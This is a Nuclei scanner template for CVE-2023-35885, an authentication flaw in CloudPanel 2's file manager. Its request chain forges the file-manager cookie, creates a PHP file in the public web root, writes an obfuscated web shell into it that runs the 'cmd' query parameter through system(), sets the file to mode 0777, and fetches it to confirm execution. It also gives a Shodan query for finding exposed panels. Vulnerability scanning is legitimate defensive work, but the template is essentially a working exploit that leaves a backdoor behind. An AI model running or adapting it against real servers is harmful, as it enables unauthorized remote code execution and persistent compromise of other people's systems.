id: CVE-2023-35885

info:
  name: Cloudpanel 2 - Remote Code Execution
  author: DhiyaneshDk
  severity: critical
  description: |
    CloudPanel 2 before 2.3.1 has insecure file-manager cookie authentication.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-35885
    - https://www.datack.my/fallingskies-cloudpanel-0-day/
    - https://github.com/datackmy/FallingSkies-CVE-2023-35885
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-35885
    cwe-id: CWE-565
    cpe: cpe:2.3:a:mgt-commerce:cloudpanel:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    verified: true
    shodan-query: title:"Cloudpanel"
  tags: cve,cve2023,cloudpanel,kev,rce,instrusive

variables:
  value: 'WAITING-FOR-TEAM-CONFIRMATION'
  str: "{{rand_base(6)}}"

http:
  - raw:
      - |
        GET /file-manager/ HTTP/1.1
        Host: {{Hostname}}
        Cookie: clp-fm={{value}}

      - |
        POST /file-manager/backend/makefile HTTP/1.1
        Host: {{Hostname}}
        Cookie: clp-fm={{value}}
        Content-Type: application/x-www-form-urlencoded

        id=%2Fhtdocs%2Fapp%2Ffiles%2Fpublic%2F&name={{str}}.php

      - |
        POST /file-manager/backend/text HTTP/1.1
        Host: {{Hostname}}
        Cookie: clp-fm={{value}}
        Content-Type: application/x-www-form-urlencoded

        id=%2Fhtdocs%2Fapp%2Ffiles%2Fpublic%2F{{str}}.php&content=%3Cpre%3E%0A%3C%3Fphp+%24x%3D%24_GET%3B%24sys%3D%22system%22%3B%24c%3D%22c%22%3B%24m%3D%22m%22%3B%24d%3D%22d%22%3B%21isset%28%24x%5B%24c.%24m.%24d%5D%29%3Fphpinfo%28%29%3A%24sys%28%24x%5B%24c.%24m.%24d%5D%29%3B%3F%3E+%0A%3C%2Fpre%3E

      - |
        POST /file-manager/backend/permissions HTTP/1.1
        Host: {{Hostname}}
        Cookie: clp-fm={{value}}
        Content-Type: application/x-www-form-urlencoded

        id=%2Fhtdocs%2Fapp%2Ffiles%2Fpublic%2F{{str}}.php&permissions=0777

      - |
        GET /{{str}}.php HTTP/2
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body_5
        words:
          - "PHP Extension"
          - "PHP Version"
        condition: and

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: body_5
        group: 1
        regex:
          - '>PHP Version <\/td><td class="v">([0-9.]+)'
